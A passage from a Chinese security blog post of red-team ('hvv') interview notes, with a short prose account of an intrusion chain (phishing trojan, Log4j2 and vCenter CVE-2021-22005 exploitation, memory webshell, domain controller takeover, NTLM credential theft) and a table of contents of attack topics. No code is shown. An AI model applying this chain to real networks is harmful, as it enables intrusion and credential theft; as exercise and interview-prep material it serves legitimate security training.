<h2 id="护网小作文系列（雾"><a href="#护网小作文系列（雾" class="headerlink" title="护网小作文系列（雾"></a>护网小作文系列（雾</h2><h3 id="溯源经历"><a href="#溯源经历" class="headerlink" title="溯源经历"></a>溯源经历</h3><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>首先在目标站点的首页上发现存在在线客服站点，通过钓鱼下木马拿到了客服个人PC权限，并且该pc处于cloud.local域内，通过对该域的信息搜集发现了VMware Horizon服务器，对其进行了分析，发现其所在的版本8.0处于Log4j2远程代码执行漏洞（CVE-2021-44228）的影响范围中，通过该漏洞写入内存马成功拿到该服务器权限，从该服务器横向移动拿到了域控主机权限，通过域控获取到了域下的vcenter服务器从vcenter后台发现了运维机，经分析发现存在CVE-2021-22005任意文件上传漏洞，通过上传木马拿到了运维机的权限，接着获取到了本地rdp联机密码以及NTLM凭据，由此进一步拿到了另一台FTP服务器，扫描同网段获取到了第二台vcenter服务器地址，同样存在CVE-2021-22005任意文件上传漏洞，上传木马拿到第二台vcenter后台，通过console口上线</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://y5neko.github.com">Y5neKO</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://y5neko.github.com/2022/10/21/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/">https://y5neko.github.com/2022/10/21/护网面试问题/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://y5neko.github.com" target="_blank">Y5neKO's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/hvv/">hvv</a><a class="post-meta__tags" href="/tags/%E9%9D%A2%E7%BB%8F/">面经</a></div><div class="post_share"><div class="social-share" data-image="/image/image-20220604141005170.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/02/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/frp%E6%8B%93%E6%89%91.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">内网渗透笔记</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/03/06/Java%E5%9F%BA%E7%A1%80/" title="Java学习笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20220429122054874.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-06</div><div class="title">Java学习笔记</div></div></a></div><div><a href="/2023/03/29/Linux%E8%BF%90%E7%BB%B4%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/" title="Linux运维疑难杂症"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://www.dmoe.cc/random.php" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-29</div><div class="title">Linux运维疑难杂症</div></div></a></div><div><a href="/2023/02/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/frp%E6%8B%93%E6%89%91.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-11</div><div class="title">内网渗透笔记</div></div></a></div><div><a href="/2023/11/09/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/" title="基础免杀"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20231109152818466.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-09</div><div class="title">基础免杀</div></div></a></div><div><a href="/2023/10/23/Java%E5%AE%89%E5%85%A8/" title="Java安全基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/image-20230808142318172.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-23</div><div class="title">Java安全基础</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.</span> <span class="toc-text">osi七层模型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%B1%82-%E5%BA%94%E7%94%A8%E5%B1%82"><span class="toc-number">1.1.</span> <span class="toc-text">第七层:应用层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%B1%82-%E8%A1%A8%E7%A4%BA%E5%B1%82"><span class="toc-number">1.2.</span> <span class="toc-text">第六层:表示层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%B1%82-%E4%BC%9A%E8%AF%9D%E5%B1%82"><span class="toc-number">1.3.</span> <span class="toc-text">第五层:会话层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%B1%82-%E4%BC%A0%E8%BE%93%E5%B1%82"><span class="toc-number">1.4.</span> <span class="toc-text">第四层:传输层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%82-%E7%BD%91%E7%BB%9C%E5%B1%82"><span class="toc-number">1.5.</span> <span class="toc-text">第三层:网络层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%82-%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82"><span class="toc-number">1.6.</span> <span class="toc-text">第二层:数据链路层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%82-%E7%89%A9%E7%90%86%E5%B1%82"><span class="toc-number">1.7.</span> <span class="toc-text">第一层:物理层</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">常见的状态码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%92%8Ccookie%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.</span> <span class="toc-text">session和cookie的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie"><span class="toc-number">3.1.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session"><span class="toc-number">3.2.</span> <span class="toc-text">session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB"><span class="toc-number">3.3.</span> <span class="toc-text">区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E6%B5%81%E7%A8%8B%E5%92%8C%E6%80%9D%E8%B7%AF%EF%BC%88%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E7%AD%89%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">渗透测试的流程和思路（外网打点等）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E7%A1%AE%E7%9B%AE%E6%A0%87"><span class="toc-number">4.1.</span> <span class="toc-text">明确目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">4.2.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whois%E4%BF%A1%E6%81%AF"><span class="toc-number">4.2.1.</span> <span class="toc-text">whois信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%90%9C%E9%9B%86"><span class="toc-number">4.2.2.</span> <span class="toc-text">域名解析搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">4.2.3.</span> <span class="toc-text">子域名收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9C%9F%E5%AE%9Eip%E8%8E%B7%E5%8F%96"><span class="toc-number">4.2.4.</span> <span class="toc-text">真实ip获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">4.2.5.</span> <span class="toc-text">指纹识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">4.2.6.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%81%E7%AB%99c%E6%AE%B5%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.2.7.</span> <span class="toc-text">旁站c段查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">4.3.1.</span> <span class="toc-text">前端信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%8C%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%AD%89"><span class="toc-number">4.3.2.</span> <span class="toc-text">敏感目录扫描，备份文件等</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">4.3.3.</span> <span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E7%82%B9"><span class="toc-number">4.3.4.</span> <span class="toc-text">注册点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%82%B9"><span class="toc-number">4.3.5.</span> <span class="toc-text">上传点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.6.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.7.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E7%BB%84%E4%BB%B6CVE%E6%88%96%E5%AD%98%E5%9C%A8exp%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.8.</span> <span class="toc-text">已知组件CVE或存在exp的漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD%E6%B8%97%E9%80%8F"><span class="toc-number">4.4.</span> <span class="toc-text">后续渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.4.1.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">sql注入的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.1.</span> <span class="toc-text">按注入类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">按数据提交方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C"><span class="toc-number">5.3.</span> <span class="toc-text">按执行效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0"><span class="toc-number">6.</span> <span class="toc-text">sql注入报错函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E4%B8%AA%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E7%82%B9"><span class="toc-number">7.</span> <span class="toc-text">sql注入的几个比较重要的点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">8.</span> <span class="toc-text">xss的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">8.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8B"><span class="toc-number">8.2.</span> <span class="toc-text">储存型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-number">8.3.</span> <span class="toc-text">DOM型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E6%94%BB%E5%87%BB"><span class="toc-number">9.</span> <span class="toc-text">CSRF攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">9.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">9.2.</span> <span class="toc-text">防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-Referer%E5%AD%97%E6%AE%B5"><span class="toc-number">9.2.1.</span> <span class="toc-text">HTTP Referer字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#token%E9%AA%8C%E8%AF%81%E6%88%96%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">9.2.2.</span> <span class="toc-text">token验证或验证码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7"><span class="toc-number">9.2.3.</span> <span class="toc-text">http中自定义属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SameSite%E5%AD%97%E6%AE%B5"><span class="toc-number">9.2.4.</span> <span class="toc-text">SameSite字段</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf%E6%94%BB%E5%87%BB"><span class="toc-number">10.</span> <span class="toc-text">ssrf攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-1"><span class="toc-number">10.2.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E6%94%BB%E5%87%BB"><span class="toc-number">11.</span> <span class="toc-text">XXE攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">11.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">11.2.</span> <span class="toc-text">攻击方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="toc-number">11.2.1.</span> <span class="toc-text">有回显读取本地文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-2"><span class="toc-number">11.3.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E8%BF%87%E7%9A%84%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-number">12.</span> <span class="toc-text">用过的安全设备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">13.</span> <span class="toc-text">黄金&#x2F;白银票据的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E8%8E%B7%E5%8F%96%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">13.1.</span> <span class="toc-text">从获取的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">13.2.</span> <span class="toc-text">从认证流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F"><span class="toc-number">13.3.</span> <span class="toc-text">从加密方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">14.</span> <span class="toc-text">了解的内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">15.</span> <span class="toc-text">php&#x2F;Java反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87cdn"><span class="toc-number">16.</span> <span class="toc-text">如何绕过cdn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E4%B8%89%E5%9B%9B%E4%B8%AA"><span class="toc-number">17.</span> <span class="toc-text">中间件漏洞  三四个</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#iis6-0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.1.</span> <span class="toc-text">iis6.0解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iis6-PUT%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.2.</span> <span class="toc-text">iis6 PUT漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iis7-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.3.</span> <span class="toc-text">iis7 解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache%E6%9C%AA%E7%9F%A5%E6%8B%93%E5%B1%95%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">17.4.</span> <span class="toc-text">Apache未知拓展名解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715"><span class="toc-number">17.5.</span> <span class="toc-text">Apache换行解析漏洞CVE-2017-15715</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-ssi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.6.</span> <span class="toc-text">Apache ssi 远程命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4-war%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2"><span class="toc-number">17.7.</span> <span class="toc-text">Tomcat弱口令&amp;war远程部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx%E7%95%B8%E5%BD%A2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.8.</span> <span class="toc-text">Nginx畸形解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-fastcgi%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">17.9.</span> <span class="toc-text">Nginx-fastcgi缓存文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">17.10.</span> <span class="toc-text">Weblogic弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CVE-2015-4852%E3%80%81CVE-2016-3510"><span class="toc-number">17.11.</span> <span class="toc-text">Weblogic反序列化CVE-2015-4852、CVE-2016-3510</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic-SSRF-CVE-2014-4210"><span class="toc-number">17.12.</span> <span class="toc-text">Weblogic SSRF CVE-2014-4210</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E4%B8%8A%E4%BC%A0-CVE-2019-2615-2618"><span class="toc-number">17.13.</span> <span class="toc-text">Weblogic任意文件读取&#x2F;上传 | CVE-2019-2615&#x2F;2618</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCVE-2019-2725"><span class="toc-number">17.14.</span> <span class="toc-text">Weblogic反序列化远程命令执行CVE-2019-2725</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2020-14882%EF%BC%8CCVE-2020-14883"><span class="toc-number">17.15.</span> <span class="toc-text">Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic%E5%90%8E%E5%8F%B0war%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E9%83%A8%E7%BD%B2"><span class="toc-number">17.16.</span> <span class="toc-text">Weblogic后台war后门文件部署</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">18.</span> <span class="toc-text">打域控的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068-Kerberos%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.1.</span> <span class="toc-text">MS14-068 Kerberos域用户提权漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8FZerologon-Netlogon-CVE-2020-1472"><span class="toc-number">18.2.</span> <span class="toc-text">域渗透Zerologon&#x2F;Netlogon CVE-2020-1472</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">18.3.</span> <span class="toc-text">永恒之蓝</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nopac-CVE-2021-42278-42287"><span class="toc-number">18.4.</span> <span class="toc-text">nopac  CVE-2021-42278&#x2F;42287</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pth-ptk-ptt"><span class="toc-number">18.5.</span> <span class="toc-text">pth&#x2F;ptk&#x2F;ptt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E4%B8%AD%E7%BB%A7"><span class="toc-number">18.6.</span> <span class="toc-text">smb中继</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlm-relay"><span class="toc-number">18.7.</span> <span class="toc-text">ntlm relay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#adcs%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83CVE-2022-26923"><span class="toc-number">18.8.</span> <span class="toc-text">adcs域内提权CVE-2022-26923</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%AE%A1token%E6%A8%AA%E5%90%91"><span class="toc-number">18.9.</span> <span class="toc-text">域管token横向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%9F%9F%E6%8E%A7%E5%BC%80%E6%94%BE%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">18.10.</span> <span class="toc-text">打域控开放的服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dcom-wmi"><span class="toc-number">18.11.</span> <span class="toc-text">dcom wmi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE"><span class="toc-number">18.12.</span> <span class="toc-text">委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">18.12.1.</span> <span class="toc-text">非约束委派</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spn%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.13.</span> <span class="toc-text">spn漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-26809"><span class="toc-number">18.14.</span> <span class="toc-text">CVE-2022-26809</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-1732"><span class="toc-number">18.15.</span> <span class="toc-text">CVE-2021-1732</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp%E7%9B%B8%E5%85%B3%E7%BB%8F%E5%8E%86"><span class="toc-number">19.</span> <span class="toc-text">编写exp相关经历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E5%92%8Clinux%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">20.</span> <span class="toc-text">windows和linux的应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E5%88%A4"><span class="toc-number">20.1.</span> <span class="toc-text">研判</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%9C%A8%E8%A2%AB%E5%85%A5%E4%BE%B5"><span class="toc-number">20.1.1.</span> <span class="toc-text">正在被入侵</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E7%9A%84%E6%9C%AA%E8%BE%BE%E6%88%90"><span class="toc-number">20.1.2.</span> <span class="toc-text">目的未达成</span></a></li><li class="toc-item 